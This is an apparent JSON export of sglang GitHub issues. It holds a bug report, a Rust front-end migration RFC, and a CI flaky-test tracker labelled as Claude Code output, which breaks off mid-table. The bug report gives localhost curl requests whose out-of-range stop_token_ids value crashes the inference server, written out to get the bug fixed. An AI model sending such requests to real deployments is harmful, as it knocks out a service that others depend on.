'{\"text\":\"Hi\",\"sampling_params\":{\"max_new_tokens\":2048,\"min_new_tokens\":2048}}' &\nsleep 1\ncurl -s localhost:30000/generate -H 'Content-Type: application/json' \\\n  -d '{\"text\":\"Hi\",\"sampling_params\":{\"max_new_tokens\":4,\"stop_token_ids\":[1000000]}}'\n```\n\nIn both cases, curl gets an empty reply and the server exits. Server log, with `CUDA_LAUNCH_BLOCKING=1`:\n\n```\nScatterGatherKernel.cu:203: operator(): ... Assertion `idx_dim >= 0 && idx_dim < index_size && \"scatter gather kernel index out of bounds\"` failed.\n  File \"sglang/srt/sampling/penaltylib/orchestrator.py\", line 198, in prepare\n  File \"sglang/srt/sampling/penaltylib/min_new_tokens.py\", line 65, in _prepare\n    ).scatter_add_(\ntorch.AcceleratorError: CUDA error: device-side assert triggered\n```\n\n`/v1/chat/completions` with `\"min_tokens\":1,\"stop_token_ids\":[1000000]` crashes the server the same way.\n\n### Environment\n\n<details><summary>python3 -m sglang.check_env</summary>\n\n```\nPython: 3.12.3 (main, Aug 31 2026, 10:18:26) [GCC 13.3.0]\nCUDA available: True\nGPU 0: NVIDIA RTX 6000 Ada Generation\nGPU 0 Compute Capability: 8.9\nCUDA_HOME: /usr/local/cuda\nNVCC: Cuda compilation tools, release 13.1, V13.1.115\nCUDA Driver Version: 580.178.04\nPyTorch: 2.13.0+cu130\nsglang: 0.5.21\nsglang-kernel: 0.4.7\nflashinfer_python: 0.6.18\nflashinfer_cubin: Module Not Found\nflashinfer_jit_cache: Module Not Found\ntriton: 3.7.1\ntransformers: 5.12.1\ntorchao: Module Not Found\nnumpy: 2.3.5\naiohttp: 3.14.5\nfastapi: 0.143.1\nhuggingface_hub: 1.33.0\ninteregular: 0.3.3\nmodelscope: 1.40.2\norjson: 3.13.0\noutlines: 0.1.11\npackaging: 26.3\npsutil: 7.2.2\npydantic: 2.14.1\npython-multipart: 0.0.32\npyzmq: 27.2.0\nuvicorn: 0.54.0\nuvloop: 0.23.0\nvllm: Module Not Found\nxgrammar: 0.2.7\nopenai: 2.6.1\ntiktoken: 0.14.0\nanthropic: 1.14.0\nlitellm: Module Not Found\ntorchcodec: 0.15.0\nNVIDIA Topology: \n\tGPU0\tCPU Affinity\tNUMA Affinity\tGPU NUMA ID\nGPU0\t X \t0-23\t0\t\tN/A\n\nLegend:\n\n  X    = Self\n  SYS  = Connection traversing PCIe as well as the SMP interconnect between NUMA nodes (e.g., QPI/UPI)\n  NODE = Connection traversing PCIe as well as the interconnect between PCIe Host Bridges within a NUMA node\n  PHB  = Connection traversing PCIe as well as a PCIe Host Bridge (typically the CPU)\n  PXB  = Connection traversing multiple PCIe bridges (without traversing the PCIe Host Bridge)\n  PIX  = Connection traversing at most a single PCIe bridge\n  NV#  = Connection traversing a bonded set of # NVLinks\n\nulimit soft: 1048576\n```\n\n</details>\n","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44535/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/44535/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/23206","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/23206/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/23206/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/23206/events","html_url":"https://github.com/sgl-project/sglang/issues/23206","id":4293003222,"node_id":"I_kwDOLCAjRs7_4gfW","number":23206,"title":"[RFC] Sglang non-GPU process rust migration","user":{"login":"rainj-me","id":96632942,"node_id":"U_kgDOBcKAbg","avatar_url":"https://avatars.githubusercontent.com/u/96632942?v=4","gravatar_id":"","url":"https://api.github.com/users/rainj-me","html_url":"https://github.com/rainj-me","followers_url":"https://api.github.com/users/rainj-me/followers","following_url":"https://api.github.com/users/rainj-me/following{/other_user}","gists_url":"https://api.github.com/users/rainj-me/gists{/gist_id}","starred_url":"https://api.github.com/users/rainj-me/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/rainj-me/subscriptions","organizations_url":"https://api.github.com/users/rainj-me/orgs","repos_url":"https://api.github.com/users/rainj-me/repos","events_url":"https://api.github.com/users/rainj-me/events{/privacy}","received_events_url":"https://api.github.com/users/rainj-me/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":15,"created_at":"2026-04-20T04:01:25Z","updated_at":"2026-10-15T17:35:28Z","closed_at":null,"assignee":null,"author_association":"COLLABORATOR","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] If this is not a feature request but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.\n- [x] Please use English. Otherwise, it will be closed.\n\n**PR**\n- https://github.com/sgl-project/sglang/pull/29799\n\nRefer Roadmap https://github.com/sgl-project/sglang/issues/22949\nRelease Roadmap https://docs.google.com/presentation/d/1Y71GY3DOzZwuAp2ytehW0rJ4uzOx276PMtgTORgD49c/edit?slide=id.g3e59bc0132c_0_0#slide=id.g3e59bc0132c_0_0\n\n### Motivation\n\n**Status**: Draft\n**Author**: @rainj-me\n**Created**: Apr 20 2026\n**Version**: 0.1\n\n# Rust Server Migration Plan\n\n**Status:** Draft · **Last updated:** 2026-06-18 · **Owner:** Rain Jiang\n\nMigration of the SGLang request front-half (everything from network ingress up to\nthe point a tokenized request is handed to the GPU scheduler) from Python to a\nmulti-threaded Rust implementation.\n\n---\n\n## 1. Goals & scope\n\n**Goal.** Replace the Python tokenizer/detokenizer managers and HTTP server with a\nsingle-process, thread-per-core Rust implementation that owns the request lifecycle\nup to scheduler submission.\n\n**In scope:** HTTP(S)/gRPC/WS/h2/h3 server, request FSM, tokenizer & detokenizer\nmanagers, multimodal encoder dispatch, control API (abort/flush/weight update etc.),\nlarge tensor zero-copy handoff to the scheduler, cross-dp-group dispatch.\n\n**Out of scope (this plan):** model kernels, attention backends, KV-cache internals,\nquantization. The Rust server keeps the existing Python scheduler and GPU worker framework; it does not reimplement them.\n\n**Non-goals:** behavioral changes to the public API. The Rust server must be a\ndrop-in for the Python one — same endpoints, same request/response schemas, same\nstreaming semantics — so it can ship behind a flag and be A/B'd against Python.\n\n---\n\n## 2. Architecture summary\n\nThe design this phase implement (decided separately; recorded here for context):\n\n- **Two FSMs, one process.** An **ingress FSM** (per request, multi-threaded,\n  thread-per-core) carrying a request from `Received` through validation and\n  optional encode/tokenize to `Queued`; and an **egress FSM** handling streaming\n  (`Streaming` self-loop → `Finalizing` → `Completed`). They are the two halves of\n  one request's lifecycle, owned by the same core and meeting at the ring-buffer /\n  scheduler boundary — no shared locks.\n- **Six thread groups:** (1) **api-server** on an async runtime — accepts\n  connections, terminates protocols; (2) **tokenizer-manager** running the\n  ingress/egress request FSMs, CPU-core-bound; (3) **encoder** (core-bound);\n  (4) **tokenizer** (core-bound); (5) **detokenizer** (core-bound); and\n  (6) the python **scheduler** group within main thread. Groups talk only via channels — no shared locks across group boundaries.\n- **Channels:** bounded **MPSC** TokenizerManager→Scheduler (`try_send` = backpressure), per-core **SPSC** returns; userspace rings carry the payload, no ZMQ involved. Crossing the Rust→Python boundary, request objects are serialized with **msgpack** so only immutable bytes transfer — keeping the GIL out of the hot path. Tensor data bypasses msgpack entirely and is shared through **pinned memory**, handed across as a handle rather than copied or serialized.\n- **Zero-copy:** for encoded multimodal data, Python pre-allocates the pinned buffer pool at startup and Rust writes into slots by index during the encode/tokenize phase. Channels move slot handles (plus small msgpack metadata), never tensor bytes; lifetime is the pool's slot-reuse policy — a slot returns to the free list only after both Python's read and any GPU DMA complete, not Rust's `Drop`.\n- **Cross-rank:** For DP attention, the first rank of each DP group runs the Rust server\n  *without* the api-server; a single api-server then fans **control** messages to\n  every DP group (duplicated, since control must reach all), while **generation**\n  requests are **round-robined** across DP groups for load balancing.\n- **Streaming:** a single `Streaming` macro state self-loops per chunk; non-streaming\n  is just a stream whose frames are accumulated and emitted in `Finalizing`.\n\nSee the request-FSM and topology diagrams in the Appendix for detail.\n\n---\n\n## 3. Phase 1 — Rust server (tok/detok manager + HTTP server)\n\n**Target: 2026-07-17**\n\nPhase 1 delivers the Rust front-half running in front of the **existing Python\nscheduler + GPU worker**, inside one process via multi-threaded Rust ⇄ Python.\n\n### 3.1 Work breakdown\n\n|  | Item | Status | Depends on | Notes |\n| :---- | :---- | :---- | :---- | :---- |\n| 1 | Rust frontend \\+ scheduler PoC | ✅ Done | — | PR [\\#23360](https://github.com/sgl-project/sglang/pull/23360) \\[Closed\\] |\n| 2 | Architecture design | ✅ Done | — | Pending final approval |\n| 3 | Pickle → msgpack migration | ✅ Done | — | PR [\\#28688](https://github.com/sgl-project/sglang/pull/28688) \\[Merged\\] Followup issue [\\#29465](https://github.com/sgl-project/sglang/issues/29465)  |\n| 4 | Single-process framework: multi-threaded Rust \\+ Python scheduler/GPU worker | ✅ Done | 3 |  |\n| 5 | Tokenizer & detokenizer manager | ✅ Done | 4 |  |\n| 6 | HTTP server: /generate \\+ streaming | ✅ Done | 4, 5 |  |\n| 7 | Encoder support | 🟡 WIP | 4, 5 | Work with dynamo team check whether this can export to dynamo crate. |\n| 8 | PD disaggregation | ✅Done | 4 | Large. Prefill/decode split — see risk note. |\n| 9 | DP attention \\+ cross-node DP controller | ✅ Done | 4 | Large, cross-node. See risk note. |\n| 10 | Metrics / logging | 🟡 WIP | 4 | Logging Done, Metrics WIP |\n| 11 | Port existing HTTP APIs other than the listed APIs below | ⏳ Pending | 6 | Full endpoint parity for drop-in replacement. |\n| 12 | Unified multi-protocol lib (server \\+ gateway) | ⏳ Pending | 6 | Shared http(s)/h2/h3/gRPC/WS layer reused by sglang-gateway. |\n| 13 | Code Refactor | 🟡 WIP |  |  |\n| 14 | AuthZ support |  |  |  |\n| 15 | Parallel Sampling |  |  |  |\n| 16 | Benchmark\\_serving perf optimization | 🟡 WIP |  |  |\n| 17 | Embedding request |  |  |  |\n| 18  | offline Engine API support |  |  |  |\n| 19 | Other flags in the TokenizedGenerateReqInput  |  |  |  |\n| 20 | cache\\_tokens |  |  |  |\n| 21 | custom\\_logit\\_processor |  |  |  |\n| 22 | preferred\\_sampling\\_params |  |  |  |\n| 23 | Standalone API-Server for DP Attn | 🟡 WIP |  |  |\n| 24 | Anthorpic API support |  |  |  |\n| 25 | SageMaker API support |  |  |  |\n| 26 | Vertex AI API support |  |  |  |\n| 27 | Ollama compatible API support |  |  |  |\n| 28 | Weight update APIs |  |  |  |\n| 29 | HiCache APIs |  |  |  |\n\n### 3.2 Sequencing & critical path\n\nItems are **not** independent. The dependency spine is:\n\n```\n#3 pickle→msgpack  ──►  #4 single-process framework  ──►  #5 tok/detok  ──►  #6 /generate+stream  ──►  #11 API parity\n                                              └─►  #10 metrics (parallel)\n                                              └─►  #7 encoder (parallel, after #5)\n```\n\n**Critical path to a usable July 17 milestone:** 3 → 4 → 5 → 6, with 10 landing in\nparallel and 11 close behind. That subset is what makes the Rust server a working,\nA/B-testable drop-in for text LLM traffic.\n\n**Recommend deferring out of the July 17 milestone** (track as Phase 1.5 / stretch):\nitems **8 (PD disaggregation)** and **9 (DP attention + cross-node DP controller)**.\nBoth are large, both can land after the core path is proven, and bundling them into\nthe July date puts the whole milestone at risk. Item **12 (unified protocol lib)** is\nvaluable but is a refactor that can follow once #6 stabilizes the protocol surface.\n\n> **Date reality check.** July 17 is ~4 weeks out and #4 (the foundation) is still\n> pending-start. The 3→4→5→6+7 path is achievable in that window if #4 starts\n> immediately and 8/9/12 are explicitly descoped. Carrying all 12 to July 17 is not\n> realistic; pick the milestone definition deliberately.\n\n### 3.3 Phase 1 exit criteria\n\n- Rust server handles `/generate` (streaming + non-streaming) at parity with Python.\n- Tok/detok managers run in-process; detok is incremental and order-correct.\n- Encoder path works for at least one multimodal input type.\n- Metrics + logs at parity; runs behind a flag, A/B-able against Python.\n- Endpoint parity sufficient to route production text traffic.\n\n---\n\n## 4. Cross-cutting concerns\n\n**Rollout / fallback.** Every phase ships behind a flag with the Python path as the\nlive fallback. Migrate by traffic slice (shadow → small % → ramp), not big-bang. keep the Python path runnable as the live fallback until the Rust path reaches parity.\n\n**Testing.** Differential testing against Python (same inputs → same tokens/frames)\nis the primary correctness gate. Add: FSM property tests (every state has a terminal\nexit; post-terminal events are no-ops/idempotent); streaming order + UTF-8-boundary\ntests for detok.\n\n**Observability.** Metrics/logging (P1 #10) should land *with* the core path, not\nafter — debugging the channel/FSM/threading layers without it is painful. Per-state\nrequest counts, queue depths (ring-buffer occupancy = backpressure signal), per-core\nload, and control-op latencies.\n\n**Kernel / environment.** io_uring features used (`MSG_RING` 5.18+, `SEND_ZC` 6.0+,\n`DEFER_TASKRUN` 6.1+) set a minimum kernel; some hardened/container environments\ndisable io_uring — keep an epoll+eventfd fallback behind the same loop abstraction.\n\n---\n\n## 5. Top risks\n\n| Risk                                              | Impact                            | Mitigation                                                                   |\n| ------------------------------------------------- | --------------------------------- | ---------------------------------------------------------------------------- |\n| July 17 scope (all 12 items)                      | Milestone slips / quality suffers | Descope 8/9/12; define milestone as 3→4→5→6+10.                              |\n| #4 framework is the foundation and hasn't started | Blocks 5–7; whole phase waits     | Start immediately; treat as the single highest-priority item.                |\n| Rust↔Python boundary in the single-process step   | Perf cliffs, GIL contention       | Keep the boundary narrow (handles, not data); measure early.                 |\n| Detok ordering / UTF-8 under streaming            | Corrupt user-visible output       | Shard by `hash(req_id)`; stateful decode offsets; boundary tests.            |\n| Slow-client backpressure on egress                | GPU stalls / memory growth        | Bounded egress buffers; treat persistent slow consumer as disconnect.        |\n\n---\n\n## 6. Milestones\n\n| Date       | Milestone                                                                                                               |\n| ---------- | ----------------------------------------------------------------------------------------------------------------------- |\n| ~Now       | #1 PR #23360, #3 merged (PR #28688); #4 started.                                                                        |\n| 2026-07-17 | **Phase 1 core:** Rust server with `/generate` + streaming + encoder + metrics, A/B-able vs Python (items 3–7, 10, 11). |\n| Phase 1.5  | PD disaggregation (#8), DP attention + cross-node controller (#9), unified protocol lib (#12).                          |\n\n\n## 7. Appendix\n\n1. [Initial plan](https://docs.google.com/presentation/d/1Y71GY3DOzZwuAp2ytehW0rJ4uzOx276PMtgTORgD49c/edit?slide=id.g3e59bc0132c_0_0#slide=id.g3e59bc0132c_0_0)\n2. [Architecture Design](https://docs.google.com/presentation/d/1_DJ_Fjq_tgMTmzWcmm5uacCi9RJGW_lwZGeXiecc6XY/edit?slide=id.g3eebae54d8d_0_0#slide=id.g3eebae54d8d_0_0)","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/23206/reactions","total_count":12,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":12,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/23206/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/42752","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/42752/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/42752/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/42752/events","html_url":"https://github.com/sgl-project/sglang/issues/42752","id":5727032329,"node_id":"I_kwDOLCAjRs8AAAABVVuUCQ","number":42752,"title":"[CI] Flaky tests and CI infrastructure failures seen while babysitting PRs","user":{"login":"nvpohanh","id":53919306,"node_id":"MDQ6VXNlcjUzOTE5MzA2","avatar_url":"https://avatars.githubusercontent.com/u/53919306?v=4","gravatar_id":"","url":"https://api.github.com/users/nvpohanh","html_url":"https://github.com/nvpohanh","followers_url":"https://api.github.com/users/nvpohanh/followers","following_url":"https://api.github.com/users/nvpohanh/following{/other_user}","gists_url":"https://api.github.com/users/nvpohanh/gists{/gist_id}","starred_url":"https://api.github.com/users/nvpohanh/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/nvpohanh/subscriptions","organizations_url":"https://api.github.com/users/nvpohanh/orgs","repos_url":"https://api.github.com/users/nvpohanh/repos","events_url":"https://api.github.com/users/nvpohanh/events{/privacy}","received_events_url":"https://api.github.com/users/nvpohanh/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":83,"created_at":"2026-10-06T10:42:20Z","updated_at":"2026-10-15T14:16:51Z","closed_at":null,"assignee":null,"author_association":"COLLABORATOR","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"[by Claude Code]\n\n<!-- sglang-flaky-tracker:v1 -->\n\nThis issue tracks **flaky tests** and **recurring CI infrastructure failures** seen in NVIDIA `PR Test Base` / `PR Test Extra` runs while babysitting PRs with the `/sglang-pr-babysit` Claude Code workflow. It complements the CI tracker #17050. #17050 lists every failure signature by date. This issue records one row per flaky test, how often it was hit, and whether a rerun with no code change passed. Use it to pick the flakiest tests to debug.\n\nA row is added only when triage found concrete evidence that the failure is **not caused by the PR** and **not a breakage on `main`**. PR-caused failures, `main` breakages, and uncertain cases are left out. Jobs that `github-actions[bot]` cancelled during a run of the maintainers' [Cancel Unfinished PR Runs](https://github.com/sgl-project/sglang/actions/workflows/cancel-unfinished-pr-tests.yml) workflow are also left out. Those are deliberate cancels, not flakes or infrastructure failures.\n\n## Flaky tests\n\n| ID | Test | Signature | Runner | Seen | Rerun passed | First seen | Last seen | Recent jobs | Status |\n|---|---|---|---|---|---|---|---|---|---|\n| T1 | `test/registered/lora/test_multi_lora_backend.py::TestMultiLoRABackend::test_ci_lora_models_multi_batch` | `AssertionError: ROUGE-L score <N> below tolerance 1.0` | `1-gpu-h100` | 9 | 6/9 | 2026-10-06 | 2026-10-08 | [#32947](https://github.com/sgl-project/sglang/actions/runs/37741919163/job/113345847472), [#41072](https://github.com/sgl-project/sglang/actions/runs/37738264988/job/113294449862), [#32947](https://github.com/sgl-project/sglang/actions/runs/37741919163/job/113273806955) | open |\n| T5 | `test/registered/e2e/models/test_deepseek_v4_flash_fp4_h200.py::TestDSV4FlashFP4H200FlashInferCutlass::test_bs_1_speed` | `AssertionError: <N> not greater than 2.8` | `8-gpu-h200` | 3 | 2/3 | 2026-10-06 | 2026-10-08 | [#32947](https://github.com/sgl-project/sglang/actions/runs/37741919163/job/113506056482), [#34535](https://github.com/sgl-project/sglang/actions/runs/37472718685/job/112592256344), [#34535](https://github.com/sgl-project/sglang/actions/runs/37472718685/job/112465283691) | open |\n| T9 | `python/sglang/multimodal_gen/test/server/test_server_1_gpu_5090.py::TestDiffusionServerOneGpu5090::test_diffusion_generation` | `PerformanceValidationError: Validation failed for '<METRIC>' (actual <N> > limit <N>)` (DecodingStage, Load Latency, Load Peak Host Anon over limits) | `1-gpu-5090` | 1 | 0/0 | 2026-10-15 | 2026-10-15 | [#42760](https://github.com/sgl-project/sglang/actions/runs/38701620590/job/116355350410) | open |\n| T6 | `test/registered/disaggregation/test_disaggregation_different_tp.py::TestDisaggregationStagingRadixPrefillLargerTP::test_gsm8k` | `File timeout after <N>s; KVTransferError: Failed to get kvcache from prefill instance, it might be dead` | `8-gpu-h20` | 1 | 1/1 | 2026-10-13 | 2026-10-13 | [#42933](https://github.com/sgl-project/sglang/actions/runs/38254445684/job/114978198137) | open |\n| T7 | `python/sglang/multimodal_gen/test/unit/test_diffusion_decoder_tile_sharding.py::TestShardedDecode::test_three_ranks_agree_with_the_serial_decode` | `DistNetworkError: server socket failed to listen, port: <N>, EADDRINUSE` (gloo `init_process_group`) | `1-gpu-h100` | 1 | 1/1 | 2026-10-13 | 2026-10-13 | [#42760](https://github.com/sgl-project/sglang/actions/runs/38399661666/job/115303981993) | open |\n| T8 | `test/registered/kernels/ops/moe/test_moe_wna16_marlin.py::test_fused_marlin_moe_nvfp4_non_gated_matches_dequant_reference` | `AssertionError: Tensor-likes are not close! Mismatched elements: <N> / <N>; abs diff <N> (up to 0.25 allowed)` | `1-gpu-h100` | 1 | 1/1 | 2026-10-13 | 2026-10-13 | [#42803](https://github.com/sgl-project/sglang/actions/runs/38340318120/job/115119634287) | open |\n| T2 | `test/registered/core/test_basic_sanity.py` | `Run test step timed out after <N> minutes with no test output` | `1-gpu-5090` | 1 | 1/1 | 2026-10-06 | 2026-10-06 | [#34535](https://github.com/sgl-project/sglang/actions/runs/37472718685/job/112300624953) | open |\n| T3 | `test/registered/hicache/test_hicache_storage.py` | `Run test step timed out after <N> minutes; file ran <N>s vs estimated <N>s` | `1-gpu-5090` | 1 | 1/1 | 2026-10-06 | 2026-10-06 | [#36810](https://github.com/sgl-project/sglang/actions/runs/37454162206/job/112246794195) | open |\n| T4 | `test/registered/e2e/models/test_glm53_flash_b200.py::TestGLM53FlashB200LowLatency::test_gsm8k` | `AssertionError: np.float64(<N>) not greater than or equal to 0.93` | `4-gpu-b200` | 1 | 1/1 | 2026-10-06 | 2026-10-06 | [#33395](https://github.com/sgl-project/sglang/actions/runs/37454576286/job/112428464909) | open |\n\n## CI infrastructure failures\n\n| ID | Job / step | Signature | Runner | Seen | Rerun passed | First seen | Last seen | Recent jobs | Status |\n|---|---|---|---|---|---|---|---|---|---|\n| I1 | `wait-for-base-b` / `wait-for-jobs` | `RequestError [HttpError]: Server Error` (GitHub jobs API 5xx) | `ubuntu-latest` | 15 | 4/15 | 2026-10-05 | 2026-10-15 | [#43685](https://github.com/sgl-project/sglang/actions/runs/38653828803/job/116244572856), [#43685](https://github.com/sgl-project/sglang/actions/runs/38526042082/job/116024006237), [#43685](https://github.com/sgl-project/sglang/actions/runs/38526042082/job/115919872733) | open |\n| I13 | `base-b-test-1-gpu-large` / `Run test` | `HfHubHTTPError: 429 Too Many Requests: you have reached your 'api' rate limit` (HF Hub download in a test) | `1-gpu-h100` | 9 | 7/9 | 2026-10-07 | 2026-10-08 | [#32947](https://github.com/sgl-project/sglang/actions/runs/37741919163/job/113470061063), [#41845](https://github.com/sgl-project/sglang/actions/runs/37738591702/job/113345368921), [#42987](https://github.com/sgl-project/sglang/actions/runs/37744383637/job/113335732751) | open |\n| I29 | `base-b-test-1-gpu-small` / `Install dependencies` | `error: Failed to install: <PKG> ... No space left on device (os error 28)` (runner disk full while installing the CI venv) | `1-gpu-5090` | 6 | 0/4 | 2026-10-15 | 2026-10-15 | [#42009](https://github.com/sgl-project/sglang/actions/runs/38700015934/job/116355964770), [#42760](https://github.com/sgl-project/sglang/actions/runs/38701620590/job/116358592959), [#44114](https://github.com/sgl-project/sglang/actions/runs/38684613088/job/116274550053) | open |\n| I15 | `base-b-test-2-gpu-large` / `Run test` | `HfHubHTTPError: 429 Too Many Requests: you have reached your 'api' rate limit` (HF Hub download in a test) | `2-gpu-h100` | 6 | 6/6 | 2026-10-08 | 2026-10-08 | [#32947](https://github.com/sgl-project/sglang/actions/runs/37741919163/job/113345848037), [#41845](https://github.com/sgl-project/sglang/actions/runs/37738591702/job/113345369206), [#42987](https://github.com/sgl-project/sglang/actions/runs/37744383637/job/113228211223) | open |\n| I28 | `base-a-test-1-gpu-small` / `Install dependencies` | `error: Failed to install: <PKG> ... No space left on device (os error 28)` (runner disk full while installing the CI venv) | `1-gpu-5090` | 5 | 3/5 | 2026-10-15 | 2026-10-15 | [#39694](https://github.com/sgl-project/sglang/actions/runs/38703705784/job/116370755806), [#39694](https://github.com/sgl-project/sglang/actions/runs/38703705784/job/116358810448), [#42746](https://github.com/sgl-project/sglang/actions/runs/38701364229/job/116358829449) | open |\n| I11 | `base-b-test-2-gpu-large` / `check-pr-test-health` | `RequestError [HttpError]: status 500` (GitHub check-runs API in the pre-test health check) | `2-gpu-h100` | 3 | 3/3 | 2026-10-07 | 2026-10-07 | [#37958](https://github.com/sgl-project/sglang/actions/runs/37626997649/job/112831457722), [#39696](https://github.com/sgl-project/sglang/actions/runs/37626972221/job/112831246877), [#39696](https://github.com/sgl-project/sglang/actions/runs/37626972221/job/112831246780) | open |\n| I22 | `base-b-test-1-gpu-small` / `Install dependencies` | `error: Failed to create virtual environment: A virtual environment already exists at: <PATH>` (runner instances on one host raced on the shared CI venv) | `1-gpu-5090` | 2 | 0/0 | 2026-10-15 | 2026-10-15 | [#43685](https://github.com/sgl-project/sglang/actions/runs/38653828803/job/116165434540), [#43685](https://github.com/sgl-project/sglang/actions/runs/38653828803/job/116165434494) | open |\n| I19 | `base-c-test-8-gpu-h20` / `Run test` | `The self-hosted runner lost communication with the server` (after mooncake RDMA `Memory region not registered` errors) | `8-gpu-h20` | 2 | 2/2 | 2026-10-13 | 2026-10-14 | [#42803](https://github.com/sgl-project/sglang/actions/runs/38547044563/job/115999194773), [#43054](https://github.com/sgl-project/sglang/actions/runs/38254580606/job/114975035195) | open |\n| I17 | `base-b-test-1-gpu-large` / `check-pr-test-health` | `RequestError [HttpError]: Server Error` (GitHub jobs API 502 in the pre-test health check) | `1-gpu-h100` | 2 | 2/2 | 2026-10-08 | 2026-10-13 | [#42760](https://github.com/sgl-project/sglang/actions/runs/38399661666/job/115452610676), [#41845](https://github.com/sgl-project/sglang/actions/runs/37738591702/job/113388345332) | open |\n| I18 | `base-c-test-4-gpu-h100` / `Run test` | `HfHubHTTPError: 429 Too Many Requests: you have reached your 'api' rate limit` (HF Hub download in a test) | `4-gpu-h100` | 2 | 2/2 | 2026-10-08 | 2026-10-08 | [#32947](https://github.com/sgl-project/sglang/actions/runs/37741919163/job/113506056529), [#41072](https://github.com/sgl-project/sglang/actions/runs/37738264988/job/113392620623) | open |\n| I21 | `wait-for-base-b` / `wait-for-jobs` | `The job has exceeded the maximum execution time of <N>h0m0s` (stage gate waited while a stage-B job sat queued for a runner) | `ubuntu-latest` | 1 | 1/1 | 2026-10-15 | 2026-10-15 | [#44114](https://github.com/sgl-project/sglang/actions/runs/38550294693/job/115871477534) | open |\n| I23 | `base-b-test-1-gpu-small` / `Install dependencies` | `E: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process <N> (apt-get)` (runner instances on one host ran apt-get at the same time) | `1-gpu-5090` | 1 | 0/0 | 2026-10-15 | 2026-10-15 | [#43685](https://github.com/sgl-project/sglang/actions/runs/38653828803/job/116165434383) | open |\n| I24 | `base-a-test-1-gpu-small` / `Run test` | `The action 'Run test' has timed out after <N> minutes` (stalled HF download of the DFlash draft model in `test_basic_sanity_dflash.py`) | `1-gpu-5090` | 1 | 1/1 | 2026-10-15 | 2026-10-15 | [#42803](https://github.com/sgl-project/sglang/actions/runs/38684438559/job/116256202585) | open |\n| I25 | `call-multimodal-gen-tests / multimodal-gen-test-4-gpu-b200` / `Run diffusion server tests` | `HfHubHTTPError: 429 Too Many Requests: you have reached your 'api' rate limit` (HF Hub `model_info` while loading a diffusion transformer) | `4-gpu-b200` | 1 | 0/0 | 2026-10-15 | 2026-10-15 | [#42760](https://github.com/sgl-project/sglang/actions/runs/38546620013/job/115794359001) | open |\n| I26 | `wait-for-base-b` / `wait-for-jobs` | `RequestError [HttpError]: We couldn't respond to your request in time` (GitHub API timeout while polling stage-B jobs) | `ubuntu-latest` | 1 | 0/1 | 2026-10-15 | 2026-10-15 | [#42746](https://github.com/sgl-project/sglang/actions/runs/38556647883/job/115857236682) | open |\n| I27 | `call-multimodal-gen-tests / multimodal-gen-test-1-5090` / `Install dependencies` | `error: Failed to install: <PKG> ... No space left on device (os error 28)` (runner disk full while installing the CI venv) | `1-gpu-5090` | 1 | 0/1 | 2026-10-15 | 2026-10-15 | [#42760](https://github.com/sgl-project/sglang/actions/runs/38701620590/job/116311167799) | open |\n| I30 | `base-b-test-1-gpu-small` / `Install dependencies` | `error: Failed to build sglang @ <PATH> ... No space left on device` (runner disk full while uv built sglang into the CI venv) | `1-gpu-5090` | 1 | 1/1 | 2026-10-15 | 2026-10-15 | [#33743](https://github.com/sgl-project/sglang/actions/runs/38702200270/job/116372768694) | open |\n| I31 | `base-c-test-8-gpu-b300` / `check-pr-test-health` | `RequestError [HttpError]: Server Error` (GitHub jobs API 502 in the pre-test health check) | `8-gpu-b300` | 1 | 1/1 | 2026-10-15 | 2026-10-15 | [#43685](https://github.com/sgl-project/sglang/actions/runs/38653828803/job/116357270960) | open |\n| I20 | `base-a-test-cpu` / `Run test` | `The action 'Run test' has timed out after <N> minutes` (slow GitHub-hosted runner; shard did not finish) | `ubuntu-latest` | 1 | 1/1 | 2026-10-14 | 2026-10-14 | [#44114](https://github.com/sgl-project/sglang/actions/runs/38550294693/job/115806695936) | open |\n| I16 | `base-b-test-1-gpu-small` / `Run test` | `HfHubHTTPError: 429 Too Many Requests: you have reached your 'api' rate limit` (HF Hub download in a test) | `1-gpu-5090` | 1 | 1/1 | 2026-10-08 | 2026-10-08 | [#42987](https://github.com/sgl-project/sglang/actions/runs/37744383637/job/113228211134) | open |\n| I12 | `base-b-test-2-gpu-large` / `runner acquisition` | `The job was not started because it repeatedly failed to be acquired (<N> attempts)` | `2-gpu-h100` | 1 | 1/1 | 2026-10-07 | 2026-10-07 | [#37958](https://github.com/sgl-project/sglang/actions/runs/37626997649/job/112831457523) | open |\n| I14 | `base-b-test-1-gpu-large` / `check-pr-test-health` | `RequestError [HttpError]: status 500` (GitHub check-runs API in the pre-test health check) | `1-gpu-h100` | 1 | 1/1 | 2026-10-07 | 2026-10-07 | 